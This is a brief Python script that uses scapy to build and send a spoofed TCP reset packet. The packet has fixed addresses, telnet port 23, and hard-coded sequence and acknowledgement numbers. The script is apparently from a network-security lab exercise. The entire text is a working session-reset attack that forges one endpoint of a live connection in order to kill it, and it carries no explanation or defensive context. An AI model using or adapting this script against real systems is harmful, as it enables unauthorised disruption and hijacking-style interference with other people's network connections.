from scapy.all import *
ip =IP(src="10.0.2.5", dst="10.0.2.6")
tcp=TCP(sport=23,dport=58754, flags="R",seq=3497153034,ack=3735014684)
pkt=ip/tcp
ls(pkt)
send(pkt,verbose=0)